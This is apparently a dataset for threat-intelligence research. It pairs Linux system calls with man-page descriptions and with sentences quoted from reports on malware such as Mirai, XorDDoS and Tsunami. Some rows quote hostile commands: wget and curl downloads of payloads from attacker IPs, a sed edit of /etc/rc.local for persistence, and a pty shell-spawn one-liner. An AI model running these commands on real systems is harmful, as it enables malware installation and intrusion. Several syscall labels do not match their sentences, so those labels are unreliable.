EntityType,ActionType,Source,Syscall,EnVerb,Sentence
FILE,CREATE_OPEN,Dofloo.Tend,symlink(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
FILE,CREATE_OPEN,Xorddos.Micro,open(),drop,The malware drops an init script at the location /etc/init.d.
FILE,CREATE_OPEN,Tsunami.Aquasec2,link(),drop,The file k.sh that was dropped and executed on the attacked server
FILE,CREATE_OPEN,Tsunami.Aquasec3,symlink(),drop,The file k.sh that was dropped and executed on the attacked server
FILE,CREATE_OPEN,Xorddos.Micro,open(),mount,one reason for the daemon process to change the directory to the root partition (“/“)is because running the process from the mounted file system prevents unmounting unless the process is stopped.
FILE,CREATE_OPEN,Miria.IsSans,openat(),mount,big-ip mounts the /usr partition read-only.
FILE,CREATE_OPEN,Miria.IsSans,mkdir(),mount,big-ip mounts the /usr partition read-only.
FILE,UPDATE,man,write(),write,write to a file descriptor
FILE,UPDATE,man,rename(),change,change the name or location of a file
FILE,UPDATE,man,rename(),rename,"rename() renames a file, moving it between directories if required."
FILE,UPDATE,man,fchmod(),change,change permissions of a file
FILE,UPDATE,man,chmod(),change,change permissions of a file
FILE,UPDATE,man,lchmod(),change,change permissions of a file
FILE,UPDATE,Xorddos.Micro,write(),update,"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
FILE,UPDATE,Xorddos.Trend2,rename(),update,Figure 3. Code snippet showing XORDDoS’ capability to download and update files.
FILE,UPDATE,Dofloo.Syscall,write(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
FILE,UPDATE,Dofloo.Security,write(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
FILE,UPDATE,Dofloo.Security,rename(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
FILE,UPDATE,Xorddos.Micro,fchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Xorddos.Micro,chmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Xorddos.Micro,lchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Dofloo.Bleep,write(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
FILE,UPDATE,Xorddos.Micro,write(),set,"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid()."
FILE,UPDATE,Xorddos.Micro,fchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,UPDATE,Xorddos.Micro,chmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,UPDATE,Xorddos.Micro,lchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,DELETE,man,rmdir(),remove,delete a directory
FILE,DELETE,man,munmap(),ummap,unmap files or devices into memory
FILE,DELETE,man,unlink(),delete,delete a name and possibly the file it refers to
FILE,DELETE,man,unlinkat(),remove,remove a directory entry relative to a directory file descriptor
FILE,DELETE,man,remove(),remove,remove a file or directory
FILE,DELETE,None,rmdir(),drop,drop the file from the victim machine
FILE,DELETE,None,remove(),drop,drop the file from the victim machine
FILE,DELETE,None,unlinkat(),drop,drop the file from the victim machine
FILE,CLOSE,man,close(),close,close a file descriptor
FILE,CLOSE,man,close(),free,the resources associated with the open file description are freed
FILE,OTHER,man,lseek(),reposition,reposition read/write file offset
PROC,PROC_EXE,man,execve(),execute,execute program
PROC,PROC_EXE,man,clone(),create,create a child process
PROC,PROC_EXE,man,fork(),create,create a child process
PROC,PROC_EXE,man,vfork(),create,create a child process and block parent
PROC,PROC_EXE,Dofloo.Syscall,execve(),use,the malware constructs a shell command and then uses the system function to execute them
PROC,PROC_EXE,Mirai.Impera,clone(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Mirai.Impera,fork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Mirai.Impera,vfork(),use,Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:
PROC,PROC_EXE,Dofloo.Mal,execve(),call,This is the function to be called when performing DoS by HTTP
PROC,PROC_EXE,Xorddos.Intezer,clone(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Xorddos.Intezer,fork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Xorddos.Intezer,vfork(),call,RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.
PROC,PROC_EXE,Xorddos.Intezer,execve(),spawn,"In the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface."
PROC,PROC_EXE,Dofloo.Mal,clone(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Dofloo.Mal,fork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Dofloo.Mal,vfork(),spawn,"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw."
PROC,PROC_EXE,Dofloo.Syscall,execve(),fork,The process then forks itself and breaks away from its parent by calling setsid(..).
PROC,PROC_EXE,Mirai.Mal,clone(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Mirai.Mal,fork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Mirai.Mal,vfork(),fork,Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).
PROC,PROC_EXE,Xorddos.Intezer,execve(),perform,The JSESSIONID value holds the command ID for the job the C2 wants the malware to perform.
PROC,PROC_EXE,Xorddos.Micro,clone(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Xorddos.Micro,fork(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Xorddos.Micro,vfork(),perform,method involves running a bash script that performs the following activities via the command line:
PROC,PROC_EXE,Dofloo.Security,execve(),install,"we saw that an attacker was able to exploit CVE-2019-3396 to infect machines with the AESDDoS botnet malware.” reads the analysis published by Trend Micro. “A shell command was remotely executed to download and execute a malicious shell script (Trojan.SH.LODEX.J), which in turn downloaded another shell script (Trojan.SH.DOGOLOAD.J) that finally installed the AESDDoS botnet malware on the affected system."
PROC,PROC_EXE,Tsunami.Cado,clone(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Tsunami.Cado,fork(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Tsunami.Cado,vfork(),install,And the kinsing malware itself was installed at /etc/kinsing
PROC,PROC_EXE,Dofloo.Syscall,execve(),add,Persistence is achieved by the malware by adding to /etc/rc.local
PROC,PROC_EXE,Tsunami.Aquasec,clone(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Tsunami.Aquasec,fork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Tsunami.Aquasec,vfork(),add,SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)
PROC,PROC_EXE,Mirai.Mal,execve(),start,bind it to the specific port (not random) TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection:
PROC,PROC_EXE,Xorddos.Micro,clone(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_EXE,Xorddos.Micro,fork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_EXE,Xorddos.Micro,vfork(),start,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
PROC,PROC_KILL,man,kill(),send,send signal to a process
PROC,PROC_KILL,man,exit_group(),exit,exit all threads in a process
PROC,PROC_KILL,Tsunami.Unit42,kill(),kill,"It then kills all Telnet and SSH related processes, and connects with a C2 server to receive further commands."
PROC,PROC_KILL,Tsunami.Trend,exit_group(),kill,Kill all current packeting.
PROC,PROC_KILL,Tsunami.Aquasec,kill(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
PROC,PROC_KILL,Tsunami.Aquasec,exit_group(),end,"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends."
PROC,PROC_TRACE,man,ptrace(),trace,process trace
PROC,PROC_TRACE,man,ptrace(),observe,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
PROC,PROC_TRACE,man,ptrace(),control,"The ptrace() system call provides a means by which one process (the ""tracer"") may observe and control the execution of another process"
PROC,PROC_TRACE,man,ptrace(),examine,examine and change the tracee's memory and registers.
PROC,PROC_TRACE,man,ptrace(),change,examine and change the tracee's memory and registers.
PROC,PROC_MEM,man,shmdt(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
PROC,PROC_MEM,man,shmat(),attach,shmat() attaches the shared memory segment identified by shmid to the address space of the calling process.
PROC,PROC_MEM,man,shmget(),allocate,allocates a shared memory segment
PROC,PROC_WAIT,man,waitpid(),wait,wait for process to change state
PROC,PROC_WAIT,man,wait4(),wait,"wait for process to change state, BSD style"
PROC,PROC_OTHER,man,mremap(),remap,remap a virtual memory address
PROC,PROC_OTHER,man,mprotect(),set,set protection on a region of memory
PROC,PROC_OTHER,man,set_tid_address(),set,set pointer to thread ID
PROC,PROC_OTHER,man,arch_prctl(),set,set architecture-specific thread state
PROC,PROC_OTHER,man,set_thread_area(),set,set a thread local storage (TLS) area
PROC,PROC_OTHER,man,nanosleep(),suspend,nanosleep() suspends the execution
PROC,PROC_OTHER,Xorddos.Intezer,nanosleep(),sleep,The malware sleeps and tries to obtain the lock on the file again when it wakes up.
PROC,PROC_OTHER,man,set_robust_list(),set,set list of robust futexes
PROC,PROC_OTHER,man,futex(),wait,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
PROC,PROC_OTHER,man,futex(),wake,"The futex() system call provides a method for a program to wait for a value at a given address to change, and a method to wake up anyone waiting on a particular address"
PROC,PROC_OTHER,man,brk(),change,change data segment size
DEVICE,DEVICE,man,ioctl(),control,control device
DEVICE,DEVICE,man,ioctl(),manipulate,The ioctl() function manipulates the underlying device parameters of special files.
ID,ID_SET,man,setsid(),set,creates a session and sets the process group ID
ID,ID_SET,Xorddos.Micro,setsid(),assign,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
ID,ID_GET,man,getppid(),get,get process identification
ID,ID_GET,man,getpid(),get,get process identification
ID,ID_GET,man,getgid(),get,get group identity
ID,ID_GET,man,getegid(),get,get group identity
ID,ID_GET,man,geteuid(),get,get user identity
ID,ID_GET,man,getuid(),get,get user identity
TIME,TIME_SET,man,settimeofday(),set,get / set time
TIME,TIME_GET,man,time(),get,get time in seconds
TIME,TIME_GET,man,gettimeofday(),get,get / set time
INFO,INFO_GET,man,prlimit64(),get,get/set resource limits
INFO,INFO_GET,man,getrlimit(),get,get/set resource limits
INFO,INFO_GET,man,ugetrlimit(),get,get/set resource limits
INFO,INFO_GET,man,sysinfo(),return,returns information on overall system statistics
INFO,INFO_GET,man,sysinfo(),get,sysinfo() provides a simple way of getting overall system statistics.
INFO,INFO_GET,man,uname(),get,get name and information about current kernel
INFO,INFO_GET,None,sysinfo(),gather,gather system information
INFO,INFO_GET,None,uname(),gather,gather system information
INFO,INFO_GET,None,sysinfo(),look,look for system information
INFO,INFO_GET,None,uname(),look,look for system information
INFO,INFO_GET,None,sysinfo(),find,find linux kernel information
INFO,INFO_GET,None,uname(),find,find linux kernel information
NET,NET_CONNECT,man,connect(),initiate,initiate a connection on a socket
NET,NET_CONNECT,man,connect(),connect,The connect() system call connects the socket referred to by the file descripton
NET,NET_CONNECT,man,pipe(),create,create pipe
NET,NET_CONNECT,man,bind(),bind,bind a name to a socket
NET,NET_CONNECT,man,bind(),assign,bind() assigns the address specified by addr to the socket
NET,NET_CONNECT,man,socket(),create,create an endpoint for communication
NET,NET_CONNECT,Xorddos.Micro,bind(),hook,Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6
NET,NET_CONNECT,Xorddos.Micro,socket(),hook,Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6
NET,NET_OPTION,man,setsockopt(),set,get and set options on sockets
NET,NET_OPTION,man,setsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
NET,NET_OPTION,man,getsockopt(),get,get and set options on sockets
NET,NET_OPTION,man,getsockopt(),manipulate,getsockopt() and setsockopt() manipulate options for the socket
NET,NET_OPTION,man,getsockname(),get,get socket name
NET,NET_TRANSMIT,man,recv(),receive,receive a message from a socket
NET,NET_TRANSMIT,man,recvmsg(),receive,receive a message from a socket
NET,NET_TRANSMIT,man,recvfrom(),receive,receive a message from a socket
NET,NET_TRANSMIT,man,send(),send,send a message on a socket
NET,NET_TRANSMIT,man,sendto(),send,send a message on a socket
NET,NET_TRANSMIT,man,sendmsg(),send,send a message on a socket
NET,NET_TRANSMIT,None,send(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,None,sendto(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,None,sendmsg(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Miria.NJCCIC,recv(),communicate,Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Micro,recv(),download,The attacker communicates with a bot to SSH brute force a target device and download XorDdos.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),wget,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Xorddos.Trend3,recvfrom(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Xorddos.Trend4,send(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Xorddos.Trend5,sendto(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Xorddos.Trend6,sendmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),curl,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,Tsunami.Jun,recvmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,Tsunami.Jun,recvfrom(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,Tsunami.Jun,send(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,Tsunami.Jun,sendto(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,Tsunami.Jun,sendmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
